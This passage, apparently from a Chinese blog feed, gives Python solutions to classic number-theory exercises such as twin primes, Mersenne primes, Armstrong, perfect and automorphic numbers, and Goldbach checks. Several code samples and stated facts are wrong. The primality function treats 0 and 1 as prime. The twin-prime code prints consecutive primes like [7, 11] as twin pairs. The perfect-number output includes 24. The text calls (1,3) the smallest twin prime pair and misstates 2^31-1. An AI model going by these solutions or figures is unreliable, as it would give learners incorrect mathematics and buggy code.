24, 25), (8, 15, 17), (9, 12, 15), (9, 40, 41), (10, 24, 26), (11, 60, 61), (12, 16, 20), (12, 35, 37), (13, 84, 85), (14, 48, 50), (15, 20, 25), (15, 36, 39), (16, 30, 34), (16, 63, 65), (18, 24, 30), (18, 80, 82), (20, 21, 29), (20, 48, 52), (21, 28, 35), (21, 72, 75), (24, 32, 40), (24, 45, 51), (24, 70, 74), (25, 60, 65), (27, 36, 45), (28, 45, 53), (28, 96, 100), (30, 40, 50), (30, 72, 78), (32, 60, 68), (33, 44, 55), (33, 56, 65), (35, 84, 91), (36, 48, 60), (36, 77, 85), (39, 52, 65), (39, 80, 89), (40, 42, 58), (40, 75, 85), (42, 56, 70), (45, 60, 75), (48, 55, 73), (48, 64, 80), (51, 68, 85), (54, 72, 90), (57, 76, 95), (60, 63, 87), (60, 80, 100), (65, 72, 97)]</span><br></pre></td></tr></table></figure><h2 id="不重复的三位数"><a href="#不重复的三位数" class="headerlink" title="不重复的三位数"></a>不重复的三位数</h2><ul><li>用1、2、3、4能组成多少个互不相同且无重复数字的三位数？都是多少？</li><li>（其实Python里面的<code>itertools</code>里面有个方法叫做<code>permutation()</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> permutations</span><br><span class="line"></span><br><span class="line">nums = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">result = []</span><br><span class="line"></span><br><span class="line">possible = permutations(nums, <span class="number">3</span>)</span><br><span class="line"><span class="keyword">for</span> a, b, c <span class="keyword">in</span> possible:</span><br><span class="line">    result.append(a*<span class="number">100</span>+b*<span class="number">10</span>+c)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(result))</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[123, 124, 132, 134, 142, 143, 213, 214, 231, 234, 241, 243, 312, 314, 321, 324, 341, 342, 412, 413, 421, 423, 431, 432]</span><br><span class="line">24</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Coding </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从零开始的Python ACM Ch.6：质数与整数练习</title>
      <link href="/posts/Go-for-Python-Ch6/"/>
      <url>/posts/Go-for-Python-Ch6/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="孪生素数"><a href="#孪生素数" class="headerlink" title="孪生素数"></a>孪生素数</h2><ul><li>问题描述<br>本节要研究孪生素数的问题，先来看看什么是孪生素数。<br>所谓孪生素数指的是间隔为2的两个相邻素数，因为它们之间的距离己经近得不能再近了，如同孪生兄弟一样，故将这一对素数称为孪生素数。<br>显然，最小的一对孪生素数是（1，3）。我们可以写出3、100以内的孪生素数，一共有8对，分别是（3，5），（5，7），（11，13），（17，19），（29，31)，（41，43），<br>（59，61)和（71，73）。随着数字的增大，孪生素数的分布也越来越稀疏，人工寻找孪生素数变得非常困难。<br>关于孪生素数还存在着一个著名的猜想一孪生素数猜想，即孪生素数是否有无穷多对，这是数论中还有待解决的一个重要问题。此处我们只讨论在有限范围内的孪生素数求解问题。</li><li>本节要解决的问题：编程求出3、1000以内的所有孪生素数。</li></ul><p>其实很简单，直接遍历就好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isPrime</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="keyword">if</span> num == <span class="number">2</span>: <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> num % <span class="number">2</span> == <span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    i = <span class="number">3</span></span><br><span class="line">    <span class="keyword">while</span> i &lt;= sqrt(num):</span><br><span class="line">        <span class="keyword">if</span> num % i == <span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        i += <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    flag = <span class="literal">False</span></span><br><span class="line">    primes = []</span><br><span class="line">    primesset = []</span><br><span class="line">    tmp = -<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        <span class="keyword">if</span> isPrime(i) <span class="keyword">and</span> <span class="keyword">not</span> flag:</span><br><span class="line">            primes.append(i)</span><br><span class="line">            flag = <span class="literal">True</span></span><br><span class="line">            tmp = i</span><br><span class="line">        <span class="keyword">elif</span> isPrime(i) <span class="keyword">and</span> flag:</span><br><span class="line">            primes.append(i)</span><br><span class="line">            primesset.append([tmp, i])</span><br><span class="line">            tmp = -<span class="number">1</span></span><br><span class="line">            flag = <span class="literal">False</span></span><br><span class="line">    <span class="built_in">print</span>(primesset)</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[[1, 2], [3, 5], [7, 11], [13, 17], [19, 23], [29, 31], [37, 41], [43, 47], [53, 59], [61, 67], [71, 73], [79, 83], [89, 97], [101, 103], [107, 109], [113, 127], [131, 137], [139, 149], [151, 157], [163, 167], [173, 179], [181, 191], [193, 197], [199, 211], [223, 227], [229, 233], [239, 241], [251, 257], [263, 269], [271, 277], [281, 283], [293, 307], [311, 313], [317, 331], [337, 347], [349, 353], [359, 367], [373, 379], [383, 389], [397, 401], [409, 419], [421, 431], [433, 439], [443, 449], [457, 461], [463, 467], [479, 487], [491, 499], [503, 509], [521, 523], [541, 547], [557, 563], [569, 571], [577, 587], [593, 599], [601, 607], [613, 617], [619, 631], [641, 643], [647, 653], [659, 661], [673, 677], [683, 691], [701, 709], [719, 727], [733, 739], [743, 751], [757, 761], [769, 773], [787, 797], [809, 811], [821, 823], [827, 829], [839, 853], [857, 859], [863, 877], [881, 883], [887, 907], [911, 919], [929, 937], [941, 947], [953, 967], [971, 977], [983, 991]]</span><br></pre></td></tr></table></figure><h2 id="梅森素数"><a href="#梅森素数" class="headerlink" title="梅森素数"></a>梅森素数</h2><ul><li>问题描述：梅森数（MersennePrime）指的是形如2n·1的正整数，其中指数n是素数，记为Mno如果一个梅森数是素数，则称其为梅森素数。例如2^2-1&#x3D;3、2^3-1：7都是梅森素数。<br>当n：2、3、5、7时，Mn都是素数，但n&#x3D;11时，Mn&#x3D;2^11-1&#x3D;2047&#x3D;23×89，显然不是梅森素数。<br>1722年，瑞士数学大师欧拉证明了2^31-1&#x3D;21474837是一个素数，它共有10位数，成为当时世界上己知的最大素数。<br>迄今为止，人们仅发现了47个梅森素数。梅森素数历来都是数论研究中的一项重要内容，也是当今科学探索中的热点和难点问题。<br>了解了梅森素数后，现在来看本节要解决的编程问题。</li><li>试求出指数n&lt;20的所有梅森素数。</li></ul><p>直接去算n在20以内质数的时候2^n-1是否为质数就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isPrime</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="keyword">if</span> num == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> num % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    i = <span class="number">3</span></span><br><span class="line">    <span class="keyword">while</span> i &lt;= sqrt(num):</span><br><span class="line">        <span class="keyword">if</span> num % i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        i += <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    flag = <span class="literal">False</span></span><br><span class="line">    primes = []</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):  <span class="comment"># 20以内的素数</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(i):</span><br><span class="line">            primes.append(i)</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> primes:</span><br><span class="line">        <span class="keyword">if</span> isPrime(<span class="number">2</span>**num-<span class="number">1</span>):</span><br><span class="line">            result.append(<span class="number">2</span>**num-<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(primes, result)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[1, 2, 3, 5, 7, 11, 13, 17, 19] [1, 3, 7, 31, 127, 8191, 131071, 524287]</span><br></pre></td></tr></table></figure><h2 id="回文数"><a href="#回文数" class="headerlink" title="回文数"></a>回文数</h2><ul><li>问题描述：打印不超过n（n&lt;256）的其平方具有对称性质的数</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;n: &#x27;</span>))</span><br><span class="line">result = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,n+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>(i**<span class="number">2</span>) == <span class="built_in">str</span>(i**<span class="number">2</span>)[::-<span class="number">1</span>]:</span><br><span class="line">        result.append(i)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[1, 2, 3, 11, 22, 26, 101, 111, 121, 202, 212]</span><br></pre></td></tr></table></figure><h2 id="水仙花数"><a href="#水仙花数" class="headerlink" title="水仙花数"></a>水仙花数</h2><ul><li>问题描述：经典题目，三位数的数位上的数字的三次方等于数字本身</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>, <span class="number">1000</span>):</span><br><span class="line">    a = <span class="built_in">str</span>(i)[<span class="number">0</span>]</span><br><span class="line">    b = <span class="built_in">str</span>(i)[<span class="number">1</span>]</span><br><span class="line">    c = <span class="built_in">str</span>(i)[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(a)**<span class="number">3</span> + <span class="built_in">int</span>(b)**<span class="number">3</span> + <span class="built_in">int</span>(c)**<span class="number">3</span> == i:</span><br><span class="line">        result.append(i)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[153, 370, 371, 407]</span><br></pre></td></tr></table></figure><h2 id="阿姆斯特朗数"><a href="#阿姆斯特朗数" class="headerlink" title="阿姆斯特朗数"></a>阿姆斯特朗数</h2><ul><li>水仙花数的翻版，任意位数也可以有这个特性，求1000以内的这种数字</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">1001</span>):</span><br><span class="line">    <span class="keyword">if</span> i &lt; <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">if</span> i**<span class="number">3</span> == i:</span><br><span class="line">            result.append(i)</span><br><span class="line">    <span class="keyword">elif</span> i &gt;= <span class="number">10</span> <span class="keyword">and</span> i &lt; <span class="number">100</span>:</span><br><span class="line">        a = <span class="built_in">str</span>(i)[<span class="number">0</span>]</span><br><span class="line">        b = <span class="built_in">str</span>(i)[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(a)**<span class="number">3</span> + <span class="built_in">int</span>(b)**<span class="number">3</span> == i:</span><br><span class="line">            result.append(i)</span><br><span class="line">    <span class="keyword">elif</span> i &gt;= <span class="number">100</span> <span class="keyword">and</span> i &lt; <span class="number">1000</span>:</span><br><span class="line">        a = <span class="built_in">str</span>(i)[<span class="number">0</span>]</span><br><span class="line">        b = <span class="built_in">str</span>(i)[<span class="number">1</span>]</span><br><span class="line">        c = <span class="built_in">str</span>(i)[<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(a)**<span class="number">3</span> + <span class="built_in">int</span>(b)**<span class="number">3</span> + <span class="built_in">int</span>(c)**<span class="number">3</span> == i:</span><br><span class="line">            result.append(i)</span><br><span class="line">    <span class="keyword">elif</span> i &gt;= <span class="number">1000</span>:</span><br><span class="line">        a = <span class="built_in">str</span>(i)[<span class="number">0</span>]</span><br><span class="line">        b = <span class="built_in">str</span>(i)[<span class="number">1</span>]</span><br><span class="line">        c = <span class="built_in">str</span>(i)[<span class="number">2</span>]</span><br><span class="line">        d = <span class="built_in">str</span>(i)[<span class="number">3</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(a)**<span class="number">3</span> + <span class="built_in">int</span>(b)**<span class="number">3</span> + <span class="built_in">int</span>(c)**<span class="number">3</span> + <span class="built_in">int</span>(d)**<span class="number">3</span> == i:</span><br><span class="line">            result.append(i)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[0, 1, 153, 370, 371, 407]</span><br></pre></td></tr></table></figure><h2 id="完数"><a href="#完数" class="headerlink" title="完数"></a>完数</h2><ul><li>问题描述：一个数如果能由其因子相加得到，就称这个数字为完数。请输出1000以内的完数</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt</span><br><span class="line"></span><br><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    factor = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">int</span>(i/<span class="number">2</span>)+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> i % j == <span class="number">0</span>: </span><br><span class="line">            factor.append(j)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">sum</span>(factor) == i: </span><br><span class="line">                result.append(i)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[6, 24, 28, 496]</span><br></pre></td></tr></table></figure><h2 id="自守数"><a href="#自守数" class="headerlink" title="自守数"></a>自守数</h2><ul><li>问题描述：一个数的平方的尾数等于自身的自然数即为自守数，求100 000以内的自守数</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>(i) == <span class="built_in">str</span>(i**<span class="number">2</span>)[-<span class="built_in">len</span>(<span class="built_in">str</span>(i)):]:</span><br><span class="line">        result.append(i)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[0, 1, 5, 6, 25, 76, 376, 625, 9376, 90625]</span><br></pre></td></tr></table></figure><h2 id="高位数的高次方位数输出"><a href="#高位数的高次方位数输出" class="headerlink" title="高位数的高次方位数输出"></a>高位数的高次方位数输出</h2><ul><li>题目描述：对于一个13位的高位数，进行13次方的运算后，输出最后三位数</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">num = <span class="built_in">input</span>(<span class="string">&#x27;num: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">result = []</span><br><span class="line">tmpnum = <span class="built_in">int</span>(num[-<span class="number">3</span>:])</span><br><span class="line">last = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">    last = <span class="built_in">int</span>(<span class="built_in">str</span>(last)[-<span class="number">3</span>:]) * tmpnum</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(last)[-<span class="number">3</span>:])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输入及输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">num: 1234567891234</span><br><span class="line">504</span><br></pre></td></tr></table></figure><p>不截断尾巴的实际数字为<code>15477282471244379725868683797046205669901003401479261325193553207435375574886373743207123231086152401578649551681124388954385182017538129322035861770786709504</code></p><p>通过比较尾数发现做法是正确的</p>]]></content>
      
      
      <categories>
          
          <category> Coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Coding </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从零开始的Python ACM Ch.5：练习系列</title>
      <link href="/posts/Go-for-Python-Ch5/"/>
      <url>/posts/Go-for-Python-Ch5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="求素数"><a href="#求素数" class="headerlink" title="求素数"></a>求素数</h2><ul><li><p>问题描述<br>求给定范围start、end之间的所有素数。</p></li><li><p>问题分析<br>素数指的是只能被1和它自身整除的整数。判定一个整数m是否为素数的关键，就是要判定整数m能否能被除1和它自身以外的其他任何整数所整除，若都不能整除，则m为素数。本题求的是给定范围start、end之间的所有素数，考虑到程序的通用性，需要从键盘输入start和end的值，例如输入sta：1，end&#x3D;1000，则所编写的程序应能够打印出1、1000之间的所有素数。</p></li><li><p>求素数的方法参考：<a href="https://blog.csdn.net/sinat_26811377/article/details/96584293">判断一个数是否为质数（素数）的4种方法_是杰夫呀的博客-CSDN博客_如何判断一个数是不是质数</a></p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt</span><br><span class="line"></span><br><span class="line">start = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;Start: &#x27;</span>))</span><br><span class="line">end = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;End: &#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isPrime</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="keyword">if</span> num == <span class="number">2</span>: <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> num % <span class="number">2</span> == <span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    i = <span class="number">3</span></span><br><span class="line">    <span class="keyword">while</span> i &lt;= sqrt(num):</span><br><span class="line">        <span class="keyword">if</span> num % i == <span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        i += <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start, end + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> isPrime(i):</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="哥德巴赫猜想"><a href="#哥德巴赫猜想" class="headerlink" title="哥德巴赫猜想"></a>哥德巴赫猜想</h2><ul><li><p>问题描述<br>2000以内的不小于4的<strong>正偶数</strong>都能够分解为两个素数之和（即验证歌德巴赫猜想对2000以内的正偶数成立）。</p></li><li><p>问题分析<br>根据问题描述，为了验证歌德巴赫猜想对2000以内的正偶数都是成立的，要将整数分解为两部分，然后判断分解出的两个整数是否均为素数。若是，则满足题意，否则应重新进行分解和判断。针对该问题，我们可以给定如下的输入和输出限定。<br>输入时：每行输入一组数据，即2000以内的正偶数n，一直输入到文件结束符为止。<br>输出时：输出n能被分解成的素数a和b。如果不止一组解，则输出其中a最小的那组解。<br>当然，读者可以根据实际的需要规定不同的输入和输出形式。</p></li><li><p>这里指定输入方式：从控制台读入，空格分割</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt</span><br><span class="line"></span><br><span class="line">nums = <span class="built_in">input</span>(<span class="string">&#x27;Nums(split with space): &#x27;</span>).split()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isPrime</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="keyword">if</span> num == <span class="number">2</span>: <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> num % <span class="number">2</span> == <span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    i = <span class="number">3</span></span><br><span class="line">    <span class="keyword">while</span> i &lt;= sqrt(num):</span><br><span class="line">        <span class="keyword">if</span> num % i == <span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        i += <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">nums = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, nums))</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> nums:</span><br><span class="line">    add1 = -<span class="number">1</span></span><br><span class="line">    add2 = -<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, num):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> isPrime(i): <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(num, <span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> isPrime(j): <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">if</span> i + j == num:</span><br><span class="line">                        add1 = i</span><br><span class="line">                        add2 = j</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> add1 != -<span class="number">1</span> <span class="keyword">and</span> add2 != -<span class="number">1</span>: <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(add1, add2)</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>输入与输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Nums(split with space): 4 5 6 7 8 9 10</span><br><span class="line">2 2</span><br><span class="line">2 3</span><br><span class="line">3 3</span><br><span class="line">2 5</span><br><span class="line">3 5</span><br><span class="line">2 7</span><br><span class="line">3 7</span><br></pre></td></tr></table></figure><h2 id="1898"><a href="#1898" class="headerlink" title="1898"></a>1898</h2><ul><li><p>问题描述：“1898一要发就发”。请将不超过1993的所有素数从小到大排成第一行，第二行上的每个数都等于它上面相邻两个素数之差。编程求出：第二行数中是否存在若干个连续的整数，它们的和恰好为1898？假如存在的话，又有几种这样的情况？<br>两行数据分别如下：<br>第一行：2，3，5，7，11，13，17 …… 1979，1987，1993</p><p>第二行：1，2，2，4，2，4……8，6</p></li></ul><p>（还没做）</p>]]></content>
      
      
      <categories>
          
          <category> Coding </category>
          
